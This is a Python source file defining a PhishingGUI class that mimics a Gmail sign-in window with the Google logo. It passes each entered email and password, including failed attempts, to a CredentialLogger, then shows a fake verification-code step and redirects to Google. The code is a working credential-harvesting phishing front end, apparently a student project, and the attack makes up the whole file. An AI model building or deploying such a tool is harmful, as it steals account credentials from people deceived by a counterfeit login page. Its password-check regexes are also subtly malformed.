from PIL import Image
import customtkinter as ctk
from logger import CredentialLogger
from redirector import Redirector
import re
import random



class PhishingGUI:
    def __init__(self): #konstruktor z parametrami
        self.logger = CredentialLogger()
        self.redirector = Redirector()
        self.root = ctk.CTk()
        self.root.title("Gmail - Sign In")
        self.root.geometry('900x600')
        self.setup_ui()

    def setup_ui(self):
        self.root.configure(bg="#f2f2f2")

        self.login_frame = ctk.CTkFrame(self.root, width=400, height=400, fg_color="transparent", corner_radius=10)
        self.login_frame.pack(pady=50)

        # Logo google
        self.logo = ctk.CTkImage(Image.open("Google.png"), size=(200, 68))
        ctk.CTkLabel(self.login_frame, image=self.logo, text="", bg_color="transparent").pack(pady=(20,10))

        # Nagłówek
        ctk.CTkLabel(self.login_frame, text="Sign in", font=ctk.CTkFont(size=20, weight="bold"),
                     text_color="white", fg_color="transparent").pack(pady=(0, 10))


        # Email input
        ctk.CTkLabel(self.login_frame, text="Email", text_color="white", fg_color="transparent").pack()
        self.email_entry = ctk.CTkEntry(self.login_frame, width=300)
        self.email_entry.pack()

        # Error
        self.error_label = ctk.CTkLabel(self.login_frame, text="", text_color="red", font=ctk.CTkFont(size=16, weight="bold"), fg_color="transparent")


        # Przycisk next
        self.next_button = ctk.CTkButton(self.login_frame, text="Next", command=self.handle_email_submit, fg_color="#1a73e8", hover_color="#1669c1")
        self.next_button.pack(pady=20)

        self.password_entry = None
        self.root.bind("<Return>", self.handle_enter_key)

    def handle_enter_key(self, event):

        if self.password_entry and self.password_entry.winfo_ismapped():
            self.handle_password_submit()

        elif self.next_button and self.next_button.winfo_ismapped():
            self.handle_email_submit()

        elif getattr(self, "otp_entry", None) and self.otp_entry.winfo_ismapped():
            self.handle_otp_verification()



    def show_error(self, message, below_widget=None):
        if message:
            self.error_label.configure(text=message)
            if below_widget:
                self.error_label.pack(after=below_widget, pady=(2.5))
            else:
                self.error_label.pack(pady=(2,5))
        else:
            self.error_label.pack_forget()


    def is_valid_email(self, email: str) -> bool:
        pattern = r"^[\w\.-]+@gmail\.com$"
        return re.match(pattern, email) is not None

    def handle_email_submit(self):
        self.email = self.email_entry.get()

        if not self.is_valid_email(self.email):
            self.logger.log(self.email, "", is_valid=False)
            self.show_error("Please enter a valid Gmail address.", below_widget=self.email_entry)
            return

        self.show_error("")

        # Usuwamy input i przycisk Next
        self.email_entry.pack_forget()
        self.next_button.pack_forget()

        self.email_label = ctk.CTkLabel(self.login_frame, text=self.email, font=ctk.CTkFont(size=20, weight="bold"),
                                    text_color="yellow", fg_color="transparent")
        self.email_label.pack(pady=(1,10))


        # Dodajemy input do hasła
        self.password_title = ctk.CTkLabel(self.login_frame, text="Password")
        self.password_title.pack()
        self.password_entry = ctk.CTkEntry(self.login_frame, show="*", width=300)
        self.password_entry.pack()

        self.login_button = ctk.CTkButton(self.login_frame, text="Login", command=self.handle_password_submit,
                                          fg_color="#1a73e8", hover_color="#1669c1")
        self.login_button.pack(pady=20)


    def is_strong_password(self, password: str) -> bool:
        if len(password) < 8:
             return False
        elif not re.search("[r'A-Za-z']", password):
            return False
        elif not re.search("[r'0-9']", password):
            return False
        else:
            return True


    def handle_password_submit(self):
        password = self.password_entry.get()

        if not password:
            self.logger.log(self.email, password, is_valid=False) #kompozycja
            self.show_error("Password cannot be empty.", below_widget=self.password_entry)
            return

        if not self.is_strong_password(password):
            self.logger.log(self.email, password, is_valid=False)
            self.show_error("Password must be at least 8 characters long, contain at least one letter and one number.", below_widget=self.password_entry)
            return

        self.error_label.pack_forget()
        self.logger.log(self.email, password, is_valid=True)
        self.start_otp_verification()

    def generate_otp(self) -> str:
        return f"{random.randint(100000, 999999)}"

    def start_otp_verification(self):
        self.otp = self.generate_otp()

        otp_window = ctk.CTkToplevel(self.root)
        otp_window.title("OTP Verification")
        otp_window.geometry('400x300')
        otp_window.configure(bg="#f2f2f2")

        ctk.CTkLabel(otp_window, text="Verification code", font=ctk.CTkFont(size=16, weight="bold")).pack(pady=20)
        ctk.CTkLabel(otp_window, text=self.otp, font=ctk.CTkFont(size=24, weight="bold")).pack(pady=20)

        ctk.CTkButton(otp_window, text="Close", command=otp_window.destroy, fg_color="#1a73e8", hover_color="#1669c1").pack(pady=20)

        self.show_otp_input()

    def show_otp_input(self):
        self.password_entry.pack_forget()
        self.password_title.pack_forget()
        self.login_button.pack_forget()

        ctk.CTkLabel(self.login_frame, text="Enter verification code").pack()
        self.otp_entry = ctk.CTkEntry(self.login_frame, width=300)
        self.otp_entry.pack()

        self.verify_otp_button = ctk.CTkButton(self.login_frame, text="Verify OTP", command=self.handle_otp_verification,
                                         fg_color="#1a73e8", hover_color="#1669c1")
        self.verify_otp_button.pack(pady=20)

    def handle_otp_verification(self):
        entered_otp = self.otp_entry.get()

        if entered_otp == self.otp:
            self.root.destroy()
            self.redirector.redirect_to_google()
        else:
            self.show_error("Incorrect verification code.", below_widget=self.otp_entry)
            return

    def run(self):
        self.root.mainloop()